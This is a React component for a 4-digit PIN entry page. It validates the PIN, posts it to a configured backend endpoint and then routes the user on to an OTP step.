import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState(new Array(4).fill(""));
  const [userEmail, setUserEmail] = useState("");
  const [loading, setLoading] = useState(false);

  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) setUserEmail(storedEmail);
  }, []);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (index < 3 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus();
    }

    setValue("pin", newPin.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then(() => {
        navigate("/otp");
      })
      .catch((error) => {
        console.error("PIN verification error", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen flex flex-col justify-start bg-white text-black px-4 pt-6 relative">
      {/* Logo & Title */}
      <div className="text-start mt-6 space-y-2">
        <div className="flex justify-center items-center space-x-2"></div>
        <h1 className="text-2xl font-semibold">Enter your current PIN</h1>
        <p className=" text-gray-600">Enter your existing 4-digit code</p>
      </div>

      {/* PIN Input */}
      <form
        onSubmit={handleSubmit(submitForm)}
        className="mt-10 text-center space-y-4"
      >
        <div className="mb-[5em]">
          <div className="flex justify-center space-x-4">
            {pin.map((digit, index) => (
              <input
                key={index}
                id={`pin-${index}`}
                type="password"
                maxLength="1"
                value={digit}
                onChange={(e) => handleChange(e.target, index)}
                onFocus={(e) => e.target.select()}
                className="w-16 h-16 rounded-sm border border-gray-300 bg-white focus:border-blue-400 outline-none text-center text-xl text-black"
                inputMode="numeric"
                pattern="[0-9]*"
                autoComplete="off"
              />
            ))}
          </div>

          <FormErrMsg errors={errors} inputName="pin" />

          <p className=" text-blue-700 cursor-pointer font-medium mt-6">
            Forgot PIN?
          </p>
        </div>
        {/* Done Button */}
        <div className="">
          <button
            type="submit"
            disabled={loading}
            className="text-white w-full rounded-lg h-12 bg-blue-700 text-md font-semibold"
          >
            {loading ? "Loading..." : "Continue"}
          </button>
        </div>
      </form>
    </div>
  );
};

export default Pin;
